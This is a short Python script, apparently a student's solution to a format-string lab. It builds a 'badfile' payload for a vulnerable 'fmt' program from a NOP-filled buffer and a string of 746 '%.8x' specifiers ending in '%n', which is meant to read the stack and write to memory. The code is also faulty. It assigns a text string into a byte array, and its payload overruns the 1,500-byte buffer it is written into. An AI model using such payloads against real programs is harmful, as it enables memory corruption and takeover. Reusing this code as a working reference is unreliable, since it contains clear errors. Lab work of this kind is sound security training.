#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
# content = bytearray(0x0 for i in range(N))
content = bytearray(0x90 for i in range(N))

# Secret Message address location from fmt program printout
# secret_msg_addr = 0x080af014
# content[0:4]  =  (secret_msg_addr).to_bytes(4,byteorder='little')


# Fill the content with NOP's


# This line shows how to store a 4-byte integer at offset 0
# number  = 0xbfffeeee
# content[0:4]  =  (number).to_bytes(4,byteorder='little')

# This line shows how to store a 4-byte string at offset 4
# content[4:8]  =  ("abcd").encode('latin-1')

# This line shows how to construct a string s with
#   12 of "%.8x", concatenated with a "%n"
s = "%.8x"*746 + "%n"
offset = 746
# s = "%.8x " * offset + "%s"

start = 16  # Change this number
content[start:start + len(s)] = s

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
# content[8:8+len(fmt)] = fmt
content[8:8+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)

sys.stdout.buffer.write(content)